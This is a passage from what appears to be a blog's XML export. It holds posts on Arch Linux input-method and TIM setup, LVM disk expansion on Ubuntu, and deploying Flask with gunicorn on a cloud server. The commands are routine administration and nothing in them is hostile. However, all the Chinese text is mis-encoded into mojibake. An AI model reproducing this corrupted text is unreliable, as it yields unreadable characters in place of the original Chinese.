<p><strong>RXnb! Letâ€™s use RXâ€™s skin for fcitx5 input method!</strong><br><a href="https://github.com/Reverier-Xu/RxWe10-Fcitx5" target="_blank" rel="noopener">https://github.com/Reverier-Xu/RxWe10-Fcitx5</a><br>Put those theme file to <code>/usr/share/fcitx5/themes/</code>, and set <code>~/.config/fcitx5/conf/classicui.conf</code>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å‚ç›´å€™é€‰åˆ—è¡¨</span></span><br><span class="line">Vertical Candidate List=False</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‰å±å¹• DPI ä½¿ç”¨</span></span><br><span class="line">PerScreenDPI=True</span><br><span class="line"></span><br><span class="line"><span class="comment"># Font (è®¾ç½®æˆä½ å–œæ¬¢çš„å­—ä½“)</span></span><br><span class="line">Font=<span class="string">"å­—ä½“å­—ä½“å­—ä½“å­—ä½“å†™åœ¨è¿™é‡Œ"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸»é¢˜</span></span><br><span class="line">Theme=RxWe10-light</span><br></pre></td></tr></table></figure>

<p>Or you can use some famous theme such as:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx5-material-color</span><br></pre></td></tr></table></figure>

<p>See Also: <a href="https://github.com/hosxy/Fcitx5-Material-Color" target="_blank" rel="noopener">https://github.com/hosxy/Fcitx5-Material-Color</a></p>
<p>If you want to use simplified Chinese, create a new file named <code>default.custom.yaml</code> under <code>$HOME/.local/share/fcitx5/rime/</code> . With <code>default.yaml</code> in <code>./build</code> folder as reference, you can customize your settings freely. Also, you can turn to <code>/usr/share/rime-data/</code> to do those things.</p>
<h2 id="Install-Jetbrains-IDEs"><a href="#Install-Jetbrains-IDEs" class="headerlink" title="Install Jetbrains IDEs"></a>Install Jetbrains IDEs</h2><p>Developers necessity. Use <code>pacman</code> or <code>yay</code> .</p>
<h2 id="Install-Tencent-shits"><a href="#Install-Tencent-shits" class="headerlink" title="Install Tencent shits"></a>Install Tencent shits</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/pacman.conf</span><br></pre></td></tr></table></figure>

<p>To use deepin-wine I have to enable multilib since my Archlinux is x64 version (?)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Sy deepin.com.qq.office</span><br></pre></td></tr></table></figure>

<p>Now TIM is installed. But we cannot run it now since it is designed to be compatible with GTK style desktops. So we:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S gnome-settings-daemon</span><br></pre></td></tr></table></figure>

<p><code>System Settings -&gt; Start up and shut down -&gt; Autostart -&gt; Add Script -&gt; /usr/lib/gsd-xsettings</code></p>
<p>Reboot. Now TIM is available. Though it is not easy to use as it is on Windows, we HAVE a TIM on Arch at least. </p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li><a href="https://www.viseator.com/2017/05/19/arch_setup/" target="_blank" rel="noopener">https://www.viseator.com/2017/05/19/arch_setup/</a></li>
<li><a href="https://www.wootec.top/2019/11/02/%E5%A6%82%E4%BD%95%E5%9C%A8Linux%E4%B8%8A%E4%BC%98%E9%9B%85%E7%9A%84%E5%A0%95%E8%90%BD/" target="_blank" rel="noopener">https://www.wootec.top/2019/11/02/%E5%A6%82%E4%BD%95%E5%9C%A8Linux%E4%B8%8A%E4%BC%98%E9%9B%85%E7%9A%84%E5%A0%95%E8%90%BD/</a></li>
<li><a href="https://www.wootec.top/2019/11/15/%E5%A6%82%E4%BD%95%E5%9C%A8Linux%E4%B8%8A%E4%BC%98%E9%9B%85%E7%9A%84%E5%A0%95%E8%90%BD-2/" target="_blank" rel="noopener">https://www.wootec.top/2019/11/15/%E5%A6%82%E4%BD%95%E5%9C%A8Linux%E4%B8%8A%E4%BC%98%E9%9B%85%E7%9A%84%E5%A0%95%E8%90%BD-2/</a></li>
<li><a href="https://rocka.me/article/arch-linux-kde-plasma-install-and-config" target="_blank" rel="noopener">https://rocka.me/article/arch-linux-kde-plasma-install-and-config</a></li>
</ol>
]]></content>
      <categories>
        <category>ç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux LVM ç®€è®°</title>
    <url>/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/</url>
    <content><![CDATA[<p>LVMï¼ˆLogical Volume Managerï¼‰ï¼Œå³é€»è¾‘å·ç®¡ç†å™¨ï¼Œå¯¹äºç¡¬ç›˜ç®¡ç†æ¥è¯´æ˜¯ååˆ†å¥½ç”¨çš„ï¼Œå°¤å…¶æ˜¯å¯¹äºå¤§å®¹é‡å­˜å‚¨è®¾å¤‡çš„ç®¡ç†æ˜¯æœ‰ç›¸å½“å¤§çš„å¥½å¤„çš„ã€‚ä¹‹å‰ä¸€ç›´å¯¹è¿™éƒ¨åˆ†ä¸€çŸ¥åŠè§£å­¦äº†å°±å¿˜ï¼Œè¿˜æ˜¯å¾—è®°å½•ä¸€ä¸‹ã€‚</p>
<a id="more"></a>

<h2 id="é©±åŠ¨å™¨ã€åˆ†åŒºå’Œå·"><a href="#é©±åŠ¨å™¨ã€åˆ†åŒºå’Œå·" class="headerlink" title="é©±åŠ¨å™¨ã€åˆ†åŒºå’Œå·"></a>é©±åŠ¨å™¨ã€åˆ†åŒºå’Œå·</h2><p><strong>é©±åŠ¨å™¨ï¼ˆDriveï¼‰</strong> ä¸€èˆ¬æŒ‡çš„æ˜¯ç”¨äºå­˜å‚¨çš„ç‰©ç†ä»‹è´¨ï¼Œå¦‚ HDDã€SSDã€U ç›˜ç­‰ï¼Œåœ¨ linux ä¸­è¡¨ç°ä¸º <code>/dev</code> ç›®å½•ä¸‹çš„å„ä¸ªè®¾å¤‡èŠ‚ç‚¹ï¼Œå¦‚ IDE è®¾å¤‡åœ¨ linux ä¸­æ˜¾ç¤ºä¸º <code>/dev/hdX</code> ï¼Œå…¶ä¸­ <code>X</code> ä¸ºå­—æ¯ï¼Œä»£è¡¨ç³»ç»Ÿæ£€æµ‹åˆ°è®¾å¤‡çš„é¡ºåºï¼Œå¦‚ç¬¬ä¸€å— IDE è®¾å¤‡å³ä¸º <code>/dev/hda</code> ï¼Œä»¥æ­¤ç±»æ¨ã€‚ç±»ä¼¼åœ°ï¼ŒSCSI è®¾å¤‡ï¼Œç°åœ¨ä¹Ÿè¢«å¹¿æ³›åº”ç”¨äºå„ç±» PATA å’Œ SATA ç›˜ï¼Œåœ¨ linux ä¸­æ˜¾ç¤ºä¸º <code>/dev/sdX</code> ã€‚</p>
<p>é©±åŠ¨å™¨å¯ä»¥è¢«åˆ†ä¸ºå¤šä¸ª<strong>åˆ†åŒºï¼ˆPartitionï¼‰</strong>ï¼Œå› æ­¤å½“æˆ‘ä»¬è°ˆè®ºåˆ†åŒºæ—¶ï¼Œæˆ‘ä»¬è°ˆè®ºçš„ä¹Ÿæ˜¯åå‘ç‰©ç†å±‚é¢çš„å†…å®¹ã€‚æ¯ä¸ªåˆ†åŒºåœ¨ linux ä¸­çš„æ˜¾ç¤ºç”±å…¶ç‰©ç†é©±åŠ¨å™¨å’Œç¼–å·ç»„æˆï¼Œä¾‹å¦‚ <code>/dev/sda</code> å¯èƒ½ä¼šæœ‰ <code>/dev/sda1</code>ï¼Œ <code>/dev/sda2</code> ç­‰å¤šä¸ªåˆ†åŒºã€‚åˆ†æˆåˆ†åŒºåæ¯ä¸ªåˆ†åŒºå³å¯åˆ†åˆ«æŒ‚è½½åˆ°æŒ‚è½½ç‚¹å®Œæˆå­˜å‚¨å·¥ä½œã€‚ä¹Ÿæœ‰ä¸€äº›ç±» Unix ç³»ç»Ÿé‡‡ç”¨è¯¸å¦‚ <code>/dev/adX</code> ï¼ˆå…¶ä¸­ <code>X</code> ä¸ºä»»æ„æ•°å­—ï¼‰çš„å½¢å¼è¡¨ç¤ºé©±åŠ¨å™¨ Xï¼Œå¹¶é‡‡ç”¨ <code>/dev/adXpY</code> ï¼ˆå…¶ä¸­ <code>X</code> å’Œ <code>Y</code> å‡ä¸ºä»»æ„æ•°å­—ï¼‰æ¥è¡¨ç¤ºé©±åŠ¨å™¨ X çš„ç¬¬ Y ä¸ªåˆ†åŒºã€‚ä¸è¿‡æ€»ä½“ä¸Šæ¥çœ‹å¤§åŒå°å¼‚ã€‚</p>
<p><strong>å·ï¼ˆVolumeï¼‰</strong> ä¸€èˆ¬æ˜¯åœ¨ LVM ç®¡ç†ä¸­æåˆ°çš„æ¦‚å¿µã€‚å…¶ä¸­ <strong>ç‰©ç†å·ï¼ˆPhysical Volumeï¼‰</strong> æŒ‡çš„æ˜¯æ•´ä¸ªé©±åŠ¨å™¨æˆ–å…¶ä¸­çš„æŸä¸ªåˆ†åŒºï¼Œå¾ˆæ˜æ˜¾æ˜¯åå‘ç‰©ç†å±‚é¢çš„æ¦‚å¿µã€‚è€Œå¯¹æ¯”ç‰©ç†å·çš„æ¦‚å¿µï¼Œ<strong>é€»è¾‘å·ï¼ˆLogical Volumeï¼‰</strong> åˆ™æ›´åå‘äºé€»è¾‘å±‚é¢ã€‚åœ¨ LVM ç®¡ç†ä¸­ï¼Œä¸€ä¸ªæˆ–å¤šä¸ªç‰©ç†å·å¯ä»¥è¢«æ˜ å°„åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªé€»è¾‘å·ä¸­ï¼Œè€Œä¸Šå±‚åº”ç”¨ä¸é€»è¾‘å·è¿›è¡Œäº¤äº’ï¼Œä»è€Œå¯¹ç›¸åº”çš„ç‰©ç†å·ä¸­çš„å­˜å‚¨å•å…ƒäº§ç”Ÿè¯»å†™ç­‰æ“ä½œï¼Œæå¤§åœ°æ–¹ä¾¿äº†å­˜å‚¨ç©ºé—´çš„ç®¡ç†ã€‚</p>
<h2 id="ä¼ ç»Ÿç£ç›˜ç®¡ç†çš„å±€é™æ€§"><a href="#ä¼ ç»Ÿç£ç›˜ç®¡ç†çš„å±€é™æ€§" class="headerlink" title="ä¼ ç»Ÿç£ç›˜ç®¡ç†çš„å±€é™æ€§"></a>ä¼ ç»Ÿç£ç›˜ç®¡ç†çš„å±€é™æ€§</h2><p>åœ¨ä¼ ç»Ÿçš„ç£ç›˜ç®¡ç†ä¸­ï¼Œç£ç›˜è¢«åˆ†ä¸ºå¤šä¸ªåˆ†åŒºï¼Œå¹¶ç›´æ¥æŒ‚è½½åˆ°æŒ‚è½½ç‚¹è¿›è¡Œä½¿ç”¨ã€‚æ¯ä¸ªåˆ†åŒºçš„å¤§å°éƒ½æ˜¯å›ºå®šçš„ï¼Œé™¤éå¯¹ç¡¬ç›˜è¿›è¡Œé‡æ–°åˆ†åŒºï¼Œå¦åˆ™å¯¹åˆ†åŒºçš„å¤§å°è¿›è¡Œå˜æ›´æ˜¯å¾ˆå›°éš¾çš„ï¼Œå°¤å…¶æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¦‚æœå› ä¸ºè¿™ç±»åŸå› å¯¼è‡´æœåŠ¡ down æ‰æ˜¯ç»å¯¹ä¸èƒ½å®¹å¿çš„ã€‚LVM æ˜¯è§£å†³è¿™ä¸€é—®é¢˜éå¸¸å¥½çš„æ–¹å¼ã€‚</p>
<p>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹ä¸­å¼•ç”¨è¿‡ä¸€æ®µæ¥æºæ— ä»è€ƒè¯çš„åè¨€ï¼š</p>
<blockquote>
<p>è®¡ç®—æœºç§‘å­¦é¢†åŸŸçš„ä»»ä½•é—®é¢˜éƒ½å¯ä»¥é€šè¿‡å¢åŠ ä¸€ä¸ªé—´æ¥çš„ä¸­é—´å±‚æ¥è§£å†³ã€‚</p>
</blockquote>
<p>æ„Ÿè§‰ LVM å°±æ˜¯åœ¨å­˜å‚¨ç©ºé—´ç®¡ç†é¢†åŸŸä¸­å¯¹è¿™å¥è¯çš„å…¸å‹åº”ç”¨å˜›â€¦â€¦ åœ¨ä¼ ç»Ÿçš„ç£ç›˜ç®¡ç†æ¨¡å¼ä¸­ï¼Œä¸Šå±‚åº”ç”¨ç›´æ¥ä¸ç‰©ç†å­˜å‚¨ä»‹è´¨äº¤äº’ï¼Œé€ æˆç®¡ç†çš„ä¸ä¾¿å’Œæ‰©å®¹çš„å›°éš¾ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼ŒLVM çš„æ–¹å¼å°±æ˜¯åœ¨ä¸­é—´åŠ å…¥äº†ä¸€å±‚ä¸­é—´å±‚ï¼Œå°†ç‰©ç†å±‚é¢çš„å­˜å‚¨ä»‹è´¨å’Œé€»è¾‘å±‚é¢çš„å­˜å‚¨è®¾å¤‡éš”ç¦»å¼€ï¼Œä½¿å¾—ä¸Šå±‚åº”ç”¨ç›´æ¥è®¿é—® LVM çš„é€»è¾‘å·ï¼Œå¹¶å°†è¦è®¿é—®çš„é€»è¾‘å·çš„å­˜å‚¨ç©ºé—´æ˜ å°„åˆ°ç‰©ç†å­˜å‚¨ä»‹è´¨ä¸Šï¼Œä»è€Œå·§å¦™åœ°å°†é€»è¾‘å±‚é¢ä¸Šæ›´æ¢ä»‹è´¨æˆ–æ‰©å……ä»‹è´¨çš„é—®é¢˜ä¸ç‰©ç†å±‚é¢çš„åˆ†ç¦»ï¼Œä»è€Œè§„é¿äº†ç‰©ç†å­˜å‚¨ç®¡ç†çš„è¯¸å¤šé—®é¢˜ã€‚</p>
<h2 id="LVM-çš„åŸç†"><a href="#LVM-çš„åŸç†" class="headerlink" title="LVM çš„åŸç†"></a>LVM çš„åŸç†</h2><p><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/lvm-structure.png" alt="LVM çš„å·¥ä½œåŸç†"></p>
<p>LVM çš„å·¥ä½œåŸç†ä¸­æœ‰ä»¥ä¸‹å‡ ä¸ªé‡è¦çš„æ¦‚å¿µï¼š</p>
<ol>
<li>ç‰©ç†å·ï¼ˆPhysical Volumeï¼‰</li>
<li>å·ç»„ï¼ˆVolume Groupï¼‰</li>
<li>é€»è¾‘å·ï¼ˆLogical Groupï¼‰</li>
</ol>
<p>è¿™å‡ ä¸ªæ¦‚å¿µæ˜¯ä¼´éšç€ LVM çš„åŸç†äº§ç”Ÿçš„ã€‚LVM å¯¹ç‰©ç†å­˜å‚¨ç©ºé—´è¿›è¡Œé€»è¾‘ç®¡ç†çš„è¿‡ç¨‹æœ‰ç‚¹åƒå¤šçº¿ç¨‹ä¸å¤šæ ¸ä¸­çš„å¤šå¯¹å¤šå…³ç³»ï¼Œå…¶å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<p><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/lvm-process.png" alt="LVM çš„å½¢æˆè¿‡ç¨‹"></p>
<ol>
<li><p>ç‰©ç†å­˜å‚¨è®¾å¤‡ç»è¿‡æ ¼å¼åŒ–å½¢æˆç‰©ç†å·ã€‚</p>
<p>åœ¨è¿™ä¸€æ­¥ä¸­ç‰©ç†å­˜å‚¨è®¾å¤‡å°†è¢«åˆ†å‰²æˆå¤šä¸ªç§°ä¸º PEï¼ˆPhysical Extentï¼‰çš„å°å•å…ƒï¼Œä¸€èˆ¬æ¯ä¸ª PE çš„å¤§å°ä¸º 4Mï¼Œç‰©ç†å­˜å‚¨è®¾å¤‡ç»è¿‡æ ¼å¼åŒ–åˆ†å‰²åå½¢æˆç‰©ç†å·ã€‚</p>
</li>
<li><p>åˆ›å»ºå·ç»„ VGï¼ˆVolume Groupï¼‰ã€‚</p>
<p>åœ¨è¿™ä¸€æ­¥ä¸­ç”±ä¸Šä¸€æ­¥å½¢æˆçš„ç‰©ç†å·ç»„åˆå½¢æˆå·ç»„ï¼Œä»¥å¯¹ä¸åŒå·ç»„å¯ä»¥è®¿é—®çš„ç‰©ç†ä»‹è´¨èŒƒå›´è¿›è¡Œé™å®šã€‚å·ç»„å¯ä»¥ä»ç‰©ç†å·ä¸­çš„ PE ä¸­ä»»æ„æŒ‘é€‰å‡ºè‹¥å¹²å—è€Œå½¢æˆã€‚</p>
</li>
<li><p>åˆ›å»ºé€»è¾‘å· LVï¼ˆLogical Volumeï¼‰ã€‚</p>
<p>åœ¨è¿™ä¸€æ­¥ä¸­æˆ‘ä»¬ä»åˆ›å»ºçš„ VG ä¸­é€‰å–å‡ºè‹¥å¹² PE ç»„æˆä¸€ä¸ª LVï¼Œåœ¨é€»è¾‘ä¸Šï¼Œæˆ‘ä»¬äº§ç”Ÿçš„ LV å’Œä¼ ç»Ÿå­˜å‚¨æ–¹æ³•ä¸­çš„åˆ†åŒºç›¸ç±»ä¼¼ï¼Œåœ¨ç»è¿‡æŒ‚è½½åéƒ½ç›´æ¥èƒ½å’Œä¸Šå±‚è¿›è¡Œäº¤äº’ã€‚ä¸åŒä¹‹å¤„æ˜¯ï¼Œæˆ‘ä»¬çš„ LV ç°åœ¨ç”±å¤šå— PE æ„æˆï¼Œæƒ³è¦å®Œæˆæ‰©å®¹ç­‰åŠŸèƒ½åªéœ€è¦å¯¹è¿™äº› PE è¿›è¡Œæ“ä½œï¼Œè€Œé¿å…äº†ç‰©ç†è®¾å¤‡å±‚é¢ä¸Šçš„è¯¸å¤šéº»çƒ¦ã€‚</p>
</li>
<li><p>å°†åˆ›å»ºå¥½çš„ LV è¿›è¡Œæ ¼å¼åŒ–åæŒ‚è½½ä½¿ç”¨ã€‚</p>
</li>
</ol>
<h2 id="å®æ“"><a href="#å®æ“" class="headerlink" title="å®æ“"></a>å®æ“</h2><p>ä¸‹é¢æ˜¯å¯¹ä½¿ç”¨ LVM çš„ Ubuntu 20.04.3 è™šæ‹Ÿæœºè¿›è¡Œæ‰©å®¹çš„å®æ“æ­¥éª¤ï¼Œåœ¨ VMWare ä¸­è¿›è¡Œæ‰©å®¹çš„æ“ä½œåœ¨æ­¤ç•¥è¿‡ã€‚</p>
<ol>
<li><p>é¦–å…ˆå¯¹ç³»ç»Ÿçš„ç‰©ç†å­˜å‚¨è®¾å¤‡è¿›è¡ŒæŸ¥çœ‹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">df -h  <span class="comment"># æŸ¥çœ‹å·²æŒ‚è½½çš„å·</span></span><br><span class="line">fdisk -l  <span class="comment"># æŸ¥çœ‹ç‰©ç†å­˜å‚¨è®¾å¤‡æƒ…å†µ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘ç°æŠ¥é”™ â€œGPT PMBR size mismatch (62914559 != 83886079) will be corrected by write.â€</span></span><br><span class="line">parted -l  <span class="comment"># ä¿®å¤åˆ†åŒºè¡¨</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/%E6%9F%A5%E7%9C%8B%E5%B7%B2%E6%8C%82%E8%BD%BD%E7%9A%84%E5%8D%B7.jpg" alt="æŸ¥çœ‹å·²æŒ‚è½½çš„å·"><br><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/%E6%9F%A5%E7%9C%8B%E7%89%A9%E7%90%86%E5%AD%98%E5%82%A8%E8%AE%BE%E5%A4%87%E6%83%85%E5%86%B5.jpg" alt="æŸ¥çœ‹ç‰©ç†å­˜å‚¨è®¾å¤‡æƒ…å†µ"></p>
</li>
<li><p>ä½¿ç”¨ parted ç»™ç‰©ç†å·è¿½åŠ å®¹é‡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">parted /dev/sda  <span class="comment"># å¯¹ç‰©ç†å­˜å‚¨è®¾å¤‡è¿›è¡Œæ“ä½œ</span></span><br><span class="line"></span><br><span class="line">unit s  <span class="comment"># è®¾ç½® Size å•ä½ï¼Œæ–¹ä¾¿è¿½åŠ è¾“å…¥</span></span><br><span class="line">p free  <span class="comment"># æŸ¥çœ‹å‰©ä½™å®¹é‡è¯¦æƒ…</span></span><br><span class="line">resizepart 3 100%  <span class="comment"># å°†æ‰€æœ‰ç©ºé—²ç©ºé—´éƒ½åˆ†é…ç»™ sda3</span></span><br><span class="line"><span class="comment"># resizepart 3   ä¹Ÿå¯ä»¥æ­¤å‘½ä»¤ä¹‹åè¾“å…¥ç»“æŸä½ç½®</span></span><br><span class="line">q  <span class="comment"># é€€å‡º</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/%E7%89%A9%E7%90%86%E5%8D%B7%E8%BF%BD%E5%8A%A0%E5%AE%B9%E9%87%8F.jpg" alt="ç‰©ç†å·è¿½åŠ å®¹é‡"></p>
</li>
<li><p>æ›´æ–° LVM ä¸­çš„ç‰©ç†å·</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pvresize /dev/sda3  <span class="comment"># æ›´æ–°pvç‰©ç†å·</span></span><br><span class="line">pvdisplay  <span class="comment"># æŸ¥çœ‹çŠ¶æ€</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/%E6%9B%B4%E6%96%B0%E7%89%A9%E7%90%86%E5%8D%B7.jpg" alt="æ›´æ–°ç‰©ç†å·"></p>
</li>
<li><p>LVM é€»è¾‘å·æ‰©å®¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lvdisplay  <span class="comment"># æŸ¥çœ‹lvæƒ…å†µ</span></span><br><span class="line">lvextend -l +100%FREE /dev/ubuntu-vg/ubuntu-lv  <span class="comment"># é€»è¾‘å·æ‰©å®¹</span></span><br><span class="line">resize2fs /dev/ubuntu-vg/ubuntu-lv  <span class="comment"># åˆ·æ–°é€»è¾‘å·</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/30/Linux-LVM-%E7%AE%80%E8%AE%B0/%E9%80%BB%E8%BE%91%E5%8D%B7%E6%89%A9%E5%AE%B9.jpg" alt="é€»è¾‘å·æ‰©å®¹"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>å¼€å‘</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>LVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu+gunicorn+nginxåœ¨ECSä¸Šæ­å»ºFlaskç¯å¢ƒ</title>
    <url>/2020/10/01/gunicorn+nginx%E5%9C%A8ECS%E4%B8%8A%E6%90%AD%E5%BB%BAFlask%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p>ç½‘ç»œä¸Šèƒ½æœç´¢åˆ°çš„èµ„æºåŸºæœ¬éƒ½æœ‰äº›ç–æ¼çš„åœ°æ–¹ï¼ŒæŠŠè‡ªå·±çš„é…ç½®è¿‡ç¨‹Poä¸Šæ¥åšä¸ªå‚è€ƒé˜²æ­¢é‡å¤è¸©å‘ã€‚</p>
<a id="more"></a>

<p><a href="https://zhuanlan.zhihu.com/p/22126999" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/22126999</a> è¿™ç¯‡ä¸“æ å†™å¾—è¿˜ä¸é”™ï¼Œå‚è€ƒäº†å…¶ä¸­çš„ä¸€äº›å†…å®¹åšäº†è‡ªå·±çš„é…ç½®ï¼Œä¸è¿‡è¿™ç¯‡é‡Œä¹Ÿæœ‰ä¸€äº›æ²¡å†™æ¸…æ¥šçš„è¶…çº§å‘ç‚¹ï¼Œå‘äº†æˆ‘å¥½ä¹…ï¼Œæˆ‘åœ¨è¿™é‡Œè¡¥å……ä¸€äº›å†…å®¹æ¥é˜²æ­¢é‡å¤è¸©å‘äº†ã€‚</p>
<p>ç›¸å…³ç‰ˆæœ¬æ¸…å•å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>ç³»ç»Ÿï¼š Ubuntu 16.04 64ä½</p>
<p>WSGIï¼š Gunicorn</p>
<p>è¿›ç¨‹ç›‘æ§ï¼š Supervisor</p>
<p>æœåŠ¡å™¨è½¯ä»¶ï¼šnginx</p>
<p>Pythonç‰ˆæœ¬ï¼š python3.5.2</p>
</blockquote>
<h1 id="äº‘æœåŠ¡å™¨ç›¸å…³"><a href="#äº‘æœåŠ¡å™¨ç›¸å…³" class="headerlink" title="äº‘æœåŠ¡å™¨ç›¸å…³"></a>äº‘æœåŠ¡å™¨ç›¸å…³</h1><p>ç¬”è€…ç”¨çš„æ˜¯é˜¿é‡Œäº‘ECSçš„å­¦ç”Ÿæœºï¼Œå½“ç„¶ä½ ç”¨å…¶å®ƒå®¶çš„äº§å“ä¹Ÿå¤§åŒå°å¼‚å•¦ã€‚</p>
<p>sshè¿æ¥ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>

<p>å»ºç«‹æ™®é€šç”¨æˆ·è´¦å·ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd www -d /home/www -m</span><br><span class="line">passwd www</span><br></pre></td></tr></table></figure>

<h1 id="å®‰è£…ç›¸å…³æ”¯æŒ"><a href="#å®‰è£…ç›¸å…³æ”¯æŒ" class="headerlink" title="å®‰è£…ç›¸å…³æ”¯æŒ"></a>å®‰è£…ç›¸å…³æ”¯æŒ</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install flask</span><br><span class="line">apt install python-pip</span><br><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå®‰è£…virtualenvé‡åˆ°ä»¥ä¸‹æŠ¥é”™ï¼š</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">IOError: [Errno <span class="number">2</span>] <span class="keyword">No</span> such <span class="keyword">file</span> <span class="keyword">or</span> directory: <span class="string">'/tmp/pip-kYFqUa-build/setup.py'</span></span><br></pre></td></tr></table></figure>

<p>å°è¯•ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure>

<h1 id="é¡µé¢é…ç½®"><a href="#é¡µé¢é…ç½®" class="headerlink" title="é¡µé¢é…ç½®"></a>é¡µé¢é…ç½®</h1><p>å…ˆä¿ç•™rootç»ˆç«¯ï¼Œæ–°å¼€ä¸€ä¸ªç»ˆç«¯å¹¶ä½¿ç”¨åˆšæ‰æ–°å»ºçš„ç”¨æˆ·ç™»å½•æœåŠ¡å™¨ã€‚</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> www<span class="variable">@xxx</span>.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºç½‘ç«™æ ¹ç›®å½•ï¼š</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> blog</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºäº†å·¥ç¨‹çš„æ–‡ä»¶å¤¹ï¼Œè¿™é‡Œç”¨blogæ¥ä»£æ›¿ï¼Œæ ¹æ®å®é™…æƒ…å†µè¦æ¢æˆå…¶å®ƒçš„å‘½åã€‚</p>
<p>ä¸‹é¢åˆ›å»ºè™šæ‹Ÿç¯å¢ƒï¼š</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">cd</span> <span class="keyword">blog</span></span><br><span class="line"><span class="keyword">virtualenv </span>-p /usr/<span class="keyword">bin/python3 </span>venv</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨SFTPå¯ä»¥ä¸Šä¼ æœ¬åœ°çš„å·¥ç¨‹æ–‡ä»¶åˆ°blogæ–‡ä»¶å¤¹ã€‚å»ºè®®ä½¿ç”¨wwwç”¨æˆ·ã€‚</p>
<p>pipåŒ…ç”Ÿæˆrequiements.txt:</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">freeze</span> &gt; requirements.txt</span><br></pre></td></tr></table></figure>

<h1 id="Gunicorné…ç½®"><a href="#Gunicorné…ç½®" class="headerlink" title="Gunicorné…ç½®"></a>Gunicorné…ç½®</h1><p>ä¸‹é¢é…ç½®Gunicornï¼š</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">source</span> <span class="string">venv/bin/activate</span></span><br><span class="line"><span class="attr">pip</span> <span class="string">install gunicorn</span></span><br><span class="line"><span class="attr">cd</span> <span class="string">/home/www/blog</span></span><br><span class="line"><span class="attr">vim</span> <span class="string">gunicorn.conf</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åç”¨vimå†™å…¥ï¼š</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è¿›ç¨‹æ•°</span></span><br><span class="line"><span class="attr">workers</span> = <span class="number">3</span></span><br><span class="line"><span class="comment"># ç›‘å¬æœ¬åœ°çš„å“ªä¸ªç«¯å£</span></span><br><span class="line"><span class="attr">bind</span> = <span class="string">'127.0.0.1:8000'</span></span><br></pre></td></tr></table></figure>

<p><code>:wq</code>ä¿å­˜é€€å‡ºã€‚</p>
<p>å®‰è£…ç»„ä»¶ï¼š</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºæ—¥å¿—æ–‡ä»¶å¤¹ï¼š</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> logs</span><br></pre></td></tr></table></figure>

<p>é€€å‡ºè™šæ‹Ÿç¯å¢ƒï¼š</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">deactivate</span></span><br></pre></td></tr></table></figure>

